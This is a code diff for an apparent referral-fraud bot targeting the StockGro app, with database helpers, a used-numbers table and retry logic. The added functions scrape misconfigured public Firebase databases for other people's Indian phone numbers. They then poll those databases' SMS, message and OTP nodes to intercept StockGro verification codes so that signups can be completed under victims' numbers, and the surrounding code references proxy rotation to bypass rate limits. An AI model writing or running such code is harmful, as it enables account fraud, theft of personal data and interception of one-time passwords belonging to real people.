@@ -23,30 +23,55 @@ def init_db(database_url):
     _warm_cache()
 
 def get_conn():
-    return db_pool.getconn()
+    global db_pool
+    try:
+        conn = db_pool.getconn()
+        if conn.closed != 0:
+            db_pool.putconn(conn, close=True)
+            conn = db_pool.getconn()
+        return conn
+    except Exception:
+        # Rebuild pool if disconnected
+        db_pool = pool.ThreadedConnectionPool(2, 20, DB_URL)
+        return db_pool.getconn()
 
-def put_conn(conn):
-    db_pool.putconn(conn)
+def put_conn(conn, close=False):
+    try:
+        db_pool.putconn(conn, close=close)
+    except Exception:
+        pass
 
 def execute(query, params=None, fetch=False, fetchone=False):
-    conn = get_conn()
-    try:
-        with conn.cursor() as cur:
-            cur.execute(query, params)
-            if fetch:
-                cols = [d[0] for d in cur.description]
-                return [dict(zip(cols, row)) for row in cur.fetchall()]
-            if fetchone:
-                cols = [d[0] for d in cur.description]
-                row = cur.fetchone()
-                return dict(zip(cols, row)) if row else None
-            conn.commit()
-            return cur.rowcount
-    except Exception as e:
-        conn.rollback()
-        raise e
-    finally:
-        put_conn(conn)
+    for attempt in range(2):
+        conn = None
+        try:
+            conn = get_conn()
+            with conn.cursor() as cur:
+                cur.execute(query, params)
+                if fetch:
+                    cols = [d[0] for d in cur.description]
+                    return [dict(zip(cols, row)) for row in cur.fetchall()]
+                if fetchone:
+                    cols = [d[0] for d in cur.description]
+                    row = cur.fetchone()
+                    return dict(zip(cols, row)) if row else None
+                conn.commit()
+                return cur.rowcount
+        except Exception as e:
+            if conn:
+                try:
+                    conn.rollback()
+                except Exception:
+                    pass
+                put_conn(conn, close=True)
+                conn = None
+            if attempt == 1:
+                raise e
+            import time
+            time.sleep(0.5)
+        finally:
+            if conn:
+                put_conn(conn)
 
 def _create_tables():
     execute("""
@@ -113,11 +138,38 @@ def _create_tables():
             added_at TIMESTAMP DEFAULT NOW()
         )
     """)
+    execute("""
+        CREATE TABLE IF NOT EXISTS used_numbers (
+            phone TEXT PRIMARY KEY,
+            added_at TIMESTAMP DEFAULT NOW()
+        )
+    """)
     # Add indexes for speed
     execute("CREATE INDEX IF NOT EXISTS idx_signups_by_user ON signups(by_user)")
     execute("CREATE INDEX IF NOT EXISTS idx_signups_status ON signups(status)")
     execute("CREATE INDEX IF NOT EXISTS idx_signups_created ON signups(created_at)")
     execute("CREATE INDEX IF NOT EXISTS idx_proxies_active ON proxies(is_active)")
+    execute("CREATE INDEX IF NOT EXISTS idx_firebase_active ON firebase_urls(is_active)")
+    execute("CREATE UNIQUE INDEX IF NOT EXISTS idx_firebase_urls_url ON firebase_urls(url)")
+
+    # Auto-seed firebase_urls from links.txt
+    try:
+        import os
+        links_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "links.txt")
+        if os.path.exists(links_path):
+            with open(links_path, "r", encoding="utf-8") as f:
+                for line in f:
+                    line = line.strip()
+                    if line and not line.startswith("#"):
+                        raw_u = line.split("|||")[0].rstrip("/")
+                        if raw_u.startswith("http"):
+                            lbl = raw_u.split("//")[-1].split(".")[0]
+                            execute(
+                                "INSERT INTO firebase_urls (url, label, is_active) VALUES (%s, %s, TRUE) ON CONFLICT (url) DO UPDATE SET label = %s",
+                                (raw_u, lbl, lbl)
+                            )
+    except Exception as e:
+        print(f"[!] Firebase seed notice: {e}")
 
     defaults = {
         "referral_code": "S4LIOAHO",
@@ -424,6 +476,175 @@ def _do_firebase_sync(phone, referral_code, name, stockgro_uid, status, error=""
             requests.post(target_url, json=record, timeout=5)
         except Exception as e:
             print(f"[!] Firebase sync error: {e}")
+
+def mark_number_used(phone):
+    """Marks a number as used/attempted so it is not picked again in auto-signup."""
+    clean_p = str(phone).replace("+91", "").replace(" ", "").replace("-", "")
+    bg_executor.submit(
+        execute,
+        "INSERT INTO used_numbers (phone) VALUES (%s) ON CONFLICT DO NOTHING",
+        (clean_p,)
+    )
+
+def is_number_used(phone):
+    clean_p = str(phone).replace("+91", "").replace(" ", "").replace("-", "")
+    row = execute("SELECT phone FROM used_numbers WHERE phone = %s", (clean_p,), fetchone=True)
+    if row:
+        return True
+    row2 = execute("SELECT phone FROM signups WHERE phone = %s AND status = 'success'", (clean_p,), fetchone=True)
+    return bool(row2)
+
+def harvest_fresh_firebase_numbers(limit=25):
+    """
+    Concurrently scans active Firebase Realtime Databases to find fresh,
+    unregistered 10-digit Indian phone numbers ready for auto signup.
+    """
+    import requests
+    import re
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+
+    urls = [u["url"] for u in get_firebase_urls(active_only=True)]
+    if not urls:
+        return []
+
+    def clean_p(raw):
+        if not raw: return None
+        s = re.sub(r'[^0-9]', '', str(raw).strip())
+        if s.startswith('91') and len(s) == 12: s = s[2:]
+        elif s.startswith('0') and len(s) == 11: s = s[1:]
+        if len(s) == 10 and s[0] in '6789': return s
+        return None
+
+    def fetch_from_db(u):
+        candidates = []
+        for node in ['numbers', 'users', 'registeredDevices']:
+            try:
+                r = requests.get(f"{u}/{node}.json?shallow=true", timeout=3)
+                if r.status_code == 200 and r.json() and isinstance(r.json(), dict):
+                    for k in r.json().keys():
+                        p = clean_p(k)
+                        if p:
+                            candidates.append({"phone": p, "fb_url": u, "node": node, "key": k})
+            except Exception:
+                pass
+        return candidates
+
+    discovered = {}
+    with ThreadPoolExecutor(max_workers=min(12, len(urls) + 1)) as pool:
+        futs = {pool.submit(fetch_from_db, u): u for u in urls}
+        for fut in as_completed(futs):
+            try:
+                res = fut.result()
+                for item in res:
+                    if item["phone"] not in discovered:
+                        discovered[item["phone"]] = item
+            except Exception:
+                pass
+
+    if not discovered:
+        return []
+
+    # Filter out already used numbers
+    try:
+        used_rows = execute("SELECT phone FROM used_numbers", fetch=True) or []
+        used_set = set(r["phone"] for r in used_rows)
+        signup_rows = execute("SELECT phone FROM signups WHERE status = 'success'", fetch=True) or []
+        used_set.update(r["phone"] for r in signup_rows)
+    except Exception:
+        used_set = set()
+
+    fresh = [item for p, item in discovered.items() if p not in used_set]
+    import random
+    random.shuffle(fresh)
+    return fresh[:limit]
+
+def poll_firebase_otp(fb_url, phone, start_timestamp=None, timeout=50, progress_callback=None):
+    """
+    Polls Firebase Realtime DB nodes in real time to capture incoming StockGro OTP.
+    Returns the 6-digit OTP string if found, or None if timed out.
+    """
+    import requests
+    import re
+    import time
+
+    clean_p = str(phone).replace("+91", "").replace(" ", "").replace("-", "")
+    t0 = time.time()
+    t_start = start_timestamp or (time.time() - 10)
+
+    def extract_otp(raw_text):
+        if not raw_text:
+            return None
+        # Match StockGro specific OTP format
+        m = re.search(r'(?i)(?:stockgro|otp|code|verification|login)[^\d]*(\d{6})', str(raw_text))
+        if m:
+            return m.group(1)
+        m2 = re.search(r'\b(\d{6})\b', str(raw_text))
+        if m2:
+            return m2.group(1)
+        return None
+
+    # Determine base URLs to poll
+    all_urls = [fb_url] if fb_url else []
+    for u in get_firebase_urls(active_only=True):
+        if u["url"] not in all_urls:
+            all_urls.append(u["url"])
+
+    interval = 2.0
+    elapsed = 0
+
+    while (time.time() - t0) < timeout:
+        elapsed = int(time.time() - t0)
+        if progress_callback:
+            try:
+                progress_callback(elapsed, timeout)
+            except Exception:
+                pass
+
+        for u in all_urls[:4]:  # Primary DBs
+            try:
+                # 1. Check direct phone node (e.g. /numbers/9075540707/otp or /numbers/+919075540707/otp)
+                for pk in [clean_p, f"+91{clean_p}"]:
+                    r1 = requests.get(f"{u}/numbers/{pk}.json", timeout=2.5)
+                    if r1.status_code == 200 and r1.json():
+                        data = r1.json()
+                        if isinstance(data, dict):
+                            otp_val = data.get("otp") or data.get("OTP") or data.get("code")
+                            if otp_val and str(otp_val).isdigit() and len(str(otp_val)) == 6:
+                                return str(otp_val)
+                        elif isinstance(data, str) and data.isdigit() and len(data) == 6:
+                            return data
+
+                # 2. Check /otp.json
+                r_otp = requests.get(f"{u}/otp.json?limitToLast=5&orderBy=\"$key\"", timeout=2.5)
+                if r_otp.status_code == 200 and r_otp.json() and isinstance(r_otp.json(), dict):
+                    for k, v in r_otp.json().items():
+                        if isinstance(v, dict):
+                            num = str(v.get("number") or v.get("mobile") or v.get("phone") or "")
+                            if clean_p in num:
+                                code = extract_otp(v.get("otp") or v.get("code") or v.get("message"))
+                                if code:
+                                    return code
+
+                # 3. Check /messages.json or /user_sms.json
+                for node in ['messages', 'user_sms', 'pendingMessages']:
+                    r_msg = requests.get(f"{u}/{node}.json?limitToLast=4&orderBy=\"$key\"", timeout=2.5)
+                    if r_msg.status_code == 200 and r_msg.json() and isinstance(r_msg.json(), dict):
+                        for dev_id, msgs in r_msg.json().items():
+                            if isinstance(msgs, dict):
+                                for mid, mdata in msgs.items():
+                                    if isinstance(mdata, dict):
+                                        m_txt = str(mdata.get("message") or mdata.get("msg") or mdata.get("text") or "")
+                                        sender = str(mdata.get("sender") or "").lower()
+                                        if "stockgro" in m_txt.lower() or "stockgro" in sender or "stkgro" in sender:
+                                            code = extract_otp(m_txt)
+                                            if code:
+                                                return code
+            except Exception:
+                pass
+
+        time.sleep(interval)
+
+    return None
 
 # ==========================================
 # PROXIES (RATE LIMIT BYPASS & ROTATION)
